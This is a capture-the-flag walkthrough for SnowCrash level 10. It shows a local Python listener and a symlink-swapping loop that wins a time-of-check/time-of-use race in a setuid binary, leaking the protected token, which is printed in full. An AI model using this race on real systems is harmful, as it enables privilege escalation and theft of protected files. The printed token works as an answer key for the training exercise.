# Level10

## Hint

You need to make a server but also do some symbolic links trickery.

## Answer

Let's check our current directory:
```
level10@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 ./
d--x--x--x  1 root    users     340 Aug 30  2015 ../
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout*
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10*
-r-x------  1 level10 level10   675 Apr  3  2012 .profile*
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

We have an executable file, let's run it first !
```
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
```

Let's create a test file and give it as an argument to our executable and use the localhost as host:
```
level10@SnowCrash:~$ echo hi > /tmp/test; ./level10 /tmp/test 0.0.0.0
Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
```

Seems like we have to make on our own server, let's do one in python:
```python
import socket

HOST = '0.0.0.0'
PORT = 6969

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    while True:
        conn, addr = s.accept()
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(data)


if __name__ == '__main__':
    main()
```

Let's run our server first and run our executable again:
```
level10@SnowCrash:~$ ./level10 /tmp/test 0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. wrote file!
```

This is the output of our server:
```
level10@SnowCrash:~$ python /tmp/uwu.py
('Connected by', ('127.0.0.1', 52407))
.*( )*.
hi
``` 

Perfect ! Now let's try with our `token` file instead:
```
level10@SnowCrash:~$ ./level10 token 0.0.0.0
You don't have access to token
```

Huh seems like we'll have to do a symbolic link again:
```
level10@SnowCrash:~$ ln -s ~/token /tmp/link
level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
You don't have access to /tmp/link
```

That doesn't work either, after a while we figured out we can exploit the symlinks to make the executable believe we have the correct permissions:
```
echo > /tmp/hack && while :; do ln -fs /tmp/hack /tmp/fake; ln -fs ~/token /tmp/fake; done
```

Essentially all we're doing here is creating a symbolic link to a file we have read permissions on, and then switching it to the `token` file which we can't read. All we have to do is get the correct timing for the executable to see that we have the correct permissions because it checks the `/tmp/fake` file and then opens the `token` file because the symlink has changed in between the two instructions.

Alright let's do our executable again *(while the python server and the shell script are running)*:
```
level10@SnowCrash:~$ ./level10 /tmp/fake 0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. wrote file!
```

And our server outputs:
```
level10@SnowCrash:~$ python /tmp/uwu.py
('Connected by', ('127.0.0.1', 52455))
.*( )*.

woupa2yuojeeaaed06riuj63c
```
